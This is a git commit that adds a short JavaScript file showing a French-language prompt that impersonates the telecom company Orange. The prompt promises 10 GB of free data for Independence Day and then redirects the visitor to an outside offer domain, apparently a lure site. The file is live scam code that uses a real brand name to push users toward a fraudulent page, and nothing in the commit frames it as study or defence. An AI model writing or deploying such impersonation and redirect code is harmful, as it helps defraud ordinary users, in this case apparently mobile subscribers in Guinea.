df6e675a62fd3089a5d7111875dd2048ab3ed204
bigetijazz4 <bigetijazz4@gmail.com>
2024-10-01 06:58:50 -0700

    Update and rename gn-independenc.js to gn-independence.js

---
+++ gn-independence.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('Orange: Félicitations, vous avez été sélectionné pour recevoir l'offre de 10 Go de données gratuites pour le jour de l'indépendance. Veuillez appuyer sur 1 pour continuer maintenant','1');
+if (password != '1') {
+location.href='https://www.moreofferzdetails.xyz/10go-et-15000gnf-recharge';
+}
